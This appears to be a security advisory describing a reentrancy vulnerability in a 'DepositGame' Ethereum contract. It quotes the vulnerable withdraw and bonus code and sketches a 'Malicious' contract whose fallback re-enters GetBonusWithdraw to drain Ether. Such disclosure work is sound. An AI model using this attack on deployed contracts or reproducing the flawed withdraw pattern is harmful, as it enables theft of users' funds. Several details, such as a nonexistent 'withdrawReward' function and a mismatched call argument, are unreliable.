# Sharing-variable-reentrancy

## Vendor
DepositGame

## Vulnerability Type
Reentrancy

## Abstract
We found a vulnerability in a smart contract of `DepositGame`, which is a deposit game. You can deposit money with `deposit()` by sending Ether to the contract.
Also, you can get the bonus withdrawn by using `GetBonusWithdraw()`, which allows a player to withdraw all her rewards together with the 10 Ether bonus for each user. 
When you want to withdraw the money, you may not get the exact amount A of money you deposit instead you will get a random amount of money, which is within \[0.9A, 1.1A\].
This game generates a random number A with `random()` for the withdraw money bet.
However, the withdraw function `GetBonusWithdraw()` is not safe enough. It allows attackers to re-enter the contract and steal money. 

## Details
The `DepositGame` is an Ethereum deposit game. You can deposit some money and then withdraw money for the game bet. 
This game allows a player to deposit money with `deposit()` by sending Ether to the contract.

```
    function deposit() public payable {
        _balances[msg.sender] += msg.value;
        TotalAmount += msg.value;
        FirstTimeBonus[msg.sender] = false;
    }
```

The `DepositGame` developer allows a player to withdraw all his/her rewards together with the 10 Ether bonus for each user.
You can get the bonus withdrawn by using `GetBonusWithdraw()`, which calls the specific operation of `withdraw()`. Here, it generates a random number with `random` for the withdrawn amount bet.

```
    function GetBonusWithdraw() public payable {
        if(FirstTimeBonus[msg.sender] != true){
          _balances[msg.sender] += 10;
          withdraw();
        }
        FirstTimeBonus[msg.sender] = true;
    }

    function withdraw() public payable {
        uint amount;
        uint randomNumber;
        uint pendingWithdrawal;
        amount = _balances[msg.sender];
        randomNumber = random() - 10;  // randomNumber is a random number between -10 and 10
        pendingWithdrawal = amount * (100 + randomNumber) / 100;
        if(pendingWithdrawal != 0){
            _balances[msg.sender] -= pendingWithdrawal;
            require(msg.sender.call.value(pendingWithdrawal)(""));
        }
        TotalAmount -= pendingWithdrawal;
    }

    function random() public returns (uint256) {
        return uint(keccak256(block.timestamp)) % MaxNumber + 1;
    }
```

However, the withdrawal operation is not safe. It allows attackers to re-enter the contract and steal money. 
As you can see the sharing variable `_balances[msg.sender]`, the developer intended to increase the balance before the withdrawal operation executed.

## Exploit
Below is the reentrancy attack of the `GetBonusWithdraw` function. We can utilize the sharing variable `_balances[msg.sender]` to steal money easily.

```
contract Malicious {
  ...
  
  function attack(){
    vul.GetBonusWithdraw(_owner);
  }

  function () payable{ // fallback function
    count++;
    if(count < 10){
      vul.GetBonusWithdraw(_owner);
    }
  }
}
```

**Analysis** `_balances[msg.sender]` is the sharing variable as it records the amount of Ether that the caller has in the contract. `_balances[msg.sender]` reduce the random amount `pendingWithdrawal` before the transfer operation `require(msg.sender.call.value(pendingWithdrawal)(""));` of function `withdraw` is executed. 
This transfer operation will trigger the `fallback` function of the contract `Malicious`. However, `_balances[msg.sender]` in function `GetBonusWithdraw` is added to 10 before calling the function `withdraw`, 
thus making the contract `DepositGame` believe that the attacker still has enough Ether in the contract. 
Then, the `fallback` function of contract `Malicious` calls the function `GetBonusWithdraw` of `DepositGame`, leading to call the function `withdraw` recurrently until the count reaches 10. 
`if(count < 10){vul.GetBonusWithdraw(_owner);}`.


## Conclusion
This reentrancy attack utilizes the sharing variable `_balances[msg.sender]` to steal Ether from the `DepositGame` contract. 
Even though `GetBonusWithdraw` does not directly execute a transfer operation, the `withdrawReward` called by `withdraw` is enough to make it vulnerable to reentrancy.
It would like to point that this reentrancy vulnerability can bypass the detection of some automatic audit smart contract tools.  

## Reference
Ethereum Official Website

https://etherscan.io/

contract source code

https://github.com/Messi-Q/SmartConrtactGames/blob/master/DepositGame.sol



